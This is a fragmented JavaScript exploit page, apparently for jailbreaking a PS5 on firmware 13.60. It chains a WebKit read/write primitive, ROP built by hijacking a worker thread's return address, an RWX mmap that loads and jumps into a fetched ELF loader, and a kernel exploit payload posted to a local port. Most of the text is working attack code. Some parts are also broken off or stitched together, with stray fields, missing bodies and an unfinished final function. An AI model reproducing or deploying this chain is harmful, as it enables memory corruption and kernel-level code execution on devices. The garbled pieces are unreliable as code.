     SAFETY NET (plain script, always runs, cannot be blocked

<script>
(function () {
    function enableButton() {
        var b = document.getElementById("jailbreak");
        var s = document.getElementById("jailbreak-stage");
        if (b) b.classList.remove("disabled");
        if (s && s.classList.contains("idle")) s.textContent = "READY";
    }
    function installFallbackClick() {
        var b = document.getElementById("jailbreak");
        if (!b) return;
        b.addEventListener("click", function (e) {
            if (window.__jailbreakHandlerInstalled) return;
            var m = document.getElementById("msg");
            if (m) m.textContent = "Exploit modules still loading — try again in a moment.";
        });
    }
    function boot() { enableButton(); installFallbackClick(); }

    if (document.readyState === "loading")
        document.addEventListener("DOMContentLoaded", boot);
    else
        boot();

    window.addEventListener("error", function (e) {
        var m = document.getElementById("msg");
        if (m && !window.__jailbreakHandlerInstalled)
            m.textContent = "Script error: " + (e.message || "unknown");
        enableButton();
    });
    window.addEventListener("unhandledrejection", function (e) {
        var m = document.getElementById("msg");
        var r = e.reason && (e.reason.message || e.reason);
        if (m && !window.__jailbreakHandlerInstalled)
            m.textContent = "Promise rejection: " + r;
        enableButton();
    });
    setTimeout(enableButton, 1000);
    setTimeout(enableButton, 3000);
})();
</script>

    loaded: false,

async function loadSlopkit() {
    try {
        const i = await import("./slopkit-main/slopkit/int64.js");
        slopkit.int64 = i.int64;

        const c = await import("./slopkit-main/slopkit/core.js");
        slopkit.establishPrimitive = c.establishPrimitive;
        slopkit.releaseFakeCell   = c.releaseFakeCell;
        slopkit.fakeCellReleased  = c.fakeCellReleased;
        slopkit.carrierHeaderCopy = c.carrierHeaderCopy;
        slopkit.carrierHomeVector = c.carrierHomeVector;
        slopkit.profile           = c.profile;

        const mm = await import("./slopkit-main/slopkit/mem.js");
        slopkit.installWindowP    = mm.installWindowP;
        slopkit.readInto          = mm.readInto;
        slopkit.toI64             = mm.toI64;
        slopkit.addrNumber        = mm.addrNumber;

        const r = await import("./slopkit-main/slopkit/rop.js");
        slopkit.worker_rop = r.worker_rop;

        slopkit.loaded = true;
        log("slopkit modules loaded", "log-ok");
    } catch (err) {
        log("slopkit load failed: " + err.message, "log-err");
        slopkit.loaded = false;
    }
}

// ----------------------------------------------------------------
// Arithmetic helpers for int64 <-> Number (avoid precision loss)
// ----------------------------------------------------------------
function numToI64(n) {
    if (n < 0) throw new RangeError("numToI64: negative");
    const hi = Math.floor(n / 0x100000000);
    return new slopkit.int64((n - hi * 0x100000000) >>> 0, hi >>> 0);
}
function i64ToNum(v) { return v.hi * 0x100000000 + v.low; }

// ----------------------------------------------------------------

async function stage1_webkit() {

                promote: true,

            });

            p.read8 = window.p.read8;
            p.read4 = window.p.read4;
            p.write8 = window.p.write8;
            p.write4 = window.p.write4;
            p.write1 = window.p.write1;
            p.leakval = window.p.leakval;
            setProgress("WebKit R/W established");

    log("Arbitrary R/W ready", "log-ok");

// ----------------------------------------------------------------
// Stage 2: Resolve libs, build ROP wrapper

function stage2_build_rop() {
    setStage("rop_ready");
    setProgress("Resolving library bases...");

    const off = getOffsetsForFirmware(fw || "13.60");

    // WebKit base from __ps5NativeCtor (set by core.js during primitive setup)
    let wkBase = null;
    const ctor = globalThis.__ps5NativeCtor;
    if (typeof ctor === "number") {
        for (const hc of off.wk_host_ctor) {
            const wb = ctor - hc;
            if (wb >= 0x800000000 && wb < 0x900000000 && wb % 0x4000 === 0) {
                wkBase = numToI64(wb);
                break;
            }
        }
    }
    if (!wkBase) throw new Error("cannot resolve WebKit base (no __ps5NativeCtor)");
    log("libSceNKWebKit: " + wkBase.toString(), "log-ok");

    let libcBase = p.read8(wkBase.add32(off.wk_memset_import));
    libcBase.sub32inplace(off.lc_memset);
    log("libSceLibcInternal: " + libcBase.toString(), "log-ok");

    let lkBase = p.read8(wkBase.add32(off.wk_stack_chk_guard_import));
    lkBase.sub32inplace(off.lk_stack_chk_guard);
    log("libKernel: " + lkBase.toString(), "log-ok");

    const gadgets = {};
    for (const k in off.wk_gadgetmap) gadgets[k] = wkBase.add32(off.wk_gadgetmap[k]);
    const syscalls = {};
    for (const k in off.syscall_map) syscalls[k] = lkBase.add32(off.syscall_map[k]);

    // Local malloc for ROP stacks — uses the primitive
    function malloc(sz) {
        const backing = new Uint32Array(0x10000 + sz);
        const ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = backing;
        return ptr;
    }

    // IMPORTANT: flat wrapper. rop.js stores the whole arg as this.p.
    const chain = new slopkit.worker_rop({
        write8: p.write8, write4: p.write4, write1: p.write1,
        read8: p.read8, read4: p.read4,
        leakval: p.leakval,
        malloc: malloc,
        gadgets: gadgets,
        syscalls: syscalls,
        libSceLibcInternalBase: libcBase,
        libKernelBase: lkBase,
        pre_chain: (c) => {
            c.push(gadgets["pop rdi"]);
            c.push(c.return_value);
            c.push(libcBase.add32(off.lc_setjmp));
        },
        launch_chain: async (c) => {
            const worker = new Worker("slopkit-main/slopkit/rop_slave.js?v=final");
            await new Promise(r => { worker.onmessage = r; worker.postMessage(0); });
            // Find worker stack
            let stack = null;
            for (let t = p.read8(lkBase.add32(off.lk_thread_list)); t.low || t.hi; t = p.read8(t.add32(0x38))) {
                const s = p.read8(t.add32(0xA8));
                const sz = p.read8(t.add32(0xB0));
                if (sz.low === 0x80000) { stack = s; break; }
            }
            if (!stack) throw new Error("worker stack not found");
            // Find return-address slot in that stack
            const expected = lkBase.add32(off.lk_worker_wait_return);
            const retPtr = await new Promise((res, rej) => {
                let tries = 0;
                const search = () => {
                    for (let i = 0x7F000; i < 0x80000; i += 8) {
                        const cand = stack.add32(i);
                        const v = p.read8(cand);
                        if (v.low === expected.low && v.hi === expected.hi) { res(cand); return; }
                    }
                    if (++tries < 50) setTimeout(search, 1);
                    else rej(new Error("worker return slot not found"));
                };
                search();
            });
            const origRet = p.read8(retPtr);
            const spPtr = retPtr.add32(0x8);
            const ctx = malloc(0x40);
            c.push_write8(ctx, origRet);
            c.push_write8(ctx.add32(0x10), retPtr);
            c.push_write8(spPtr, p.read8(spPtr));
            c.push(gadgets["pop rdi"]); c.push(ctx);
            c.push(libcBase.add32(off.lc_longjmp));
            p.write8(retPtr, gadgets["pop rsp"]);
            p.write8(spPtr, c.stack_entry_point);
            await new Promise(r => { worker.onmessage = r; worker.postMessage(0); });
        }
    });

    p.chain = chain;
    p.gadgets = gadgets;
    p.syscalls = syscalls;
    p.lkBase = lkBase;
    p.libcBase = libcBase;
    p.wkBase = wkBase;
    p.offsets = off;
}

// ----------------------------------------------------------------
// Stage 3: find mmap syscall stub in libkernel (pattern scan)
// ----------------------------------------------------------------
function findMmapStub() {
    const sysno = 477; // FreeBSD mmap
    const b0 = sysno & 0xff, b1 = (sysno >> 8) & 0xff, b2 = (sysno >> 16) & 0xff, b3 = (sysno >> 24) & 0xff;
    const CHUNK = 0x1000;
    const buf = new Uint8Array(CHUNK);
    for (let base = 0; base < 0x100000; base += CHUNK) {
        try { slopkit.readInto(buf, p.lkBase.add32(base), CHUNK); }
        catch (e) { continue; }
        for (let i = 0; i < CHUNK - 8; i++) {
            if (buf[i] !== 0xB8) continue;
            if (buf[i+1] !== b0 || buf[i+2] !== b1 || buf[i+3] !== b2 || buf[i+4] !== b3) continue;
            if (buf[i+5] !== 0x0F || buf[i+6] !== 0x05 || buf[i+7] !== 0xC3) continue;
            return p.lkBase.add32(base + i);
        }
    }
    return null;
}

// ----------------------------------------------------------------
// Stage 4: load elfldr.elf via ROP
// ----------------------------------------------------------------
function parseElf(buf) {
    const dv = new DataView(buf.buffer, buf.byteOffset, buf.byteLength);
    if (dv.getUint32(0, true) !== 0x464C457F) throw new Error("not ELF");
    if (dv.getUint8(4) !== 2) throw new Error("not ELF64");
    if (dv.getUint8(5) !== 1) throw new Error("not little-endian");
    const e_entry = Number(dv.getBigUint64(0x18, true));
    const e_phoff = Number(dv.getBigUint64(0x20, true));
    const e_phentsize = dv.getUint16(0x36, true);
    const e_phnum = dv.getUint16(0x38, true);
    const segments = [];
    for (let i = 0; i < e_phnum; i++) {
        const off = e_phoff + i * e_phentsize;
        const p_type = dv.getUint32(off + 0x00, true);
        if (p_type !== 1) continue; // PT_LOAD only
        const p_flags   = dv.getUint32(off + 0x04, true);
        const p_offset  = Number(dv.getBigUint64(off + 0x08, true));
        const p_vaddr   = Number(dv.getBigUint64(off + 0x10, true));
        const p_filesz  = Number(dv.getBigUint64(off + 0x20, true));
        const p_memsz   = Number(dv.getBigUint64(off + 0x28, true));
        segments.push({ flags: p_flags, offset: p_offset, vaddr: p_vaddr, filesz: p_filesz, memsz: p_memsz });
    }
    return { entry: e_entry, segments };
}

async function stage3_load_elfldr() {
    setStage("elfldr_load");
    setMsg("Loading elfldr via ROP...");
    setProgress("Fetching elfldr-ps5-1360.elf...");

    const r = await fetch("payloads/elfldr-ps5-1360.elf");
    if (!r.ok) throw new Error("cannot fetch elfldr-ps5-1360.elf");
    const elf = new Uint8Array(await r.arrayBuffer());
    log("elfldr: " + elf.length + " bytes", "log-info");

    const parsed = parseElf(elf);
    log("elfldr: " + parsed.segments.length + " PT_LOAD segs, entry=0x" + parsed.entry.toString(16), "log-info");

    // mmap stub
    const mmapStub = findMmapStub();
    if (!mmapStub) throw new Error("mmap stub not found in libkernel");
    log("mmap stub: " + mmapStub.toString(), "log-ok");

    // Choose a base address for the load
    const BASE = 0x90000000;
    const PAGE = 0x4000;

    // MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED = 0x2 | 0x1000 | 0x10 = 0x1012
    // PROT_RWX = 7
    // reserve whole span
    let span = 0;
    for (const s of parsed.segments) span = Math.max(span, s.vaddr + s.memsz);
    span = (span + PAGE - 1) & ~(PAGE - 1);

    const chain = p.chain;
    chain.fcall(mmapStub, BASE, span, 7, 0x1012, -1, 0);
    chain.write_result(chain.return_value);
    await chain.run();
    const gotBase = i64ToNum(p.read8(chain.return_value));
    log("mmap(base=0x" + BASE.toString(16) + ", span=0x" + span.toString(16) + ") -> 0x" + gotBase.toString(16), "log-info");
    if (gotBase <= 0x10000) throw new Error("mmap failed (return=" + gotBase + ")");

    // Write each segment
    for (const s of parsed.segments) {
        const dest = numToI64(BASE + s.vaddr);
        const slice = elf.subarray(s.offset, s.offset + s.filesz);
        log("writing segment vaddr=0x" + s.vaddr.toString(16) + " filesz=0x" + s.filesz.toString(16), "log-info");
        for (let i = 0; i < slice.length; i += 8) {
            const n = Math.min(8, slice.length - i);
            let lo = 0, hi = 0;
            for (let j = 0; j < n; j++) {
                const b = slice[i + j];
                if (j < 4) lo |= b << (j * 8);
                else hi |= b << ((j - 4) * 8);
            }
            p.write8(dest.add32(i), new slopkit.int64(lo >>> 0, hi >>> 0));
        }
    }

    // Jump
    const entryAddr = numToI64(BASE + parsed.entry);
    log("jumping to entry " + entryAddr.toString(), "log-info");
    chain.fcall(entryAddr);
    await chain.run();
    log("elfldr entry executed", "log-ok");
}

// ----------------------------------------------------------------
// Stage 5: wait for elfldr to bind, then send kstuff
// ----------------------------------------------------------------
async function waitForPort(port, attempts, label) {
    for (let i = 0; i < attempts; i++) {
        try {
            await fetch("http://127.0.0.1:" + port + "/", { method: "GET", mode: "no-cors" });
            return true;
        } catch (e) { /* keep trying */ }
        if (i % 5 === 0) setProgress(label + " " + (i + 1) + "/" + attempts);
        await new Promise(r => setTimeout(r, 1000));
    }
    return false;
}

async function stage4_send_kstuff() {
    setStage("kernel_exploit");
    setMsg("Waiting for elfldr on :9026...");
    const okElfldr = await waitForPort(9026, 30, "Waiting for elfldr");
    if (!okElfldr) throw new Error("elfldr did not bind :9026");
    log("elfldr is up on :9026", "log-ok");

    setMsg("Sending kstuff.elf...");
    const r = await fetch("payloads/kstuff.elf");
    if (!r.ok) throw new Error("cannot fetch kstuff.elf");
    const kstuff = await r.arrayBuffer();
    await fetch("http://127.0.0.1:9026/load", { method: "POST", mode: "no-cors", body: kstuff });
    log("kstuff sent (" + kstuff.byteLength + " bytes)", "log-ok");
}

async function stage5_verify() {
    setStage("verify");
    setMsg("Verifying kernel exploit...");
    const ok = await waitForPort(9020, 30, "Waiting for kstuff");
    if (!ok) throw new Error("kstuff did not respond on :9020");
    log("kstuff active on :9020", "log-ok");
}

async function runFullChain() {
    if (!slopkit.loaded) throw new Error("slopkit not loaded");
    if (slopkit.fakeCellReleased && slopkit.fakeCellReleased())

    await stage1_webkit();

}
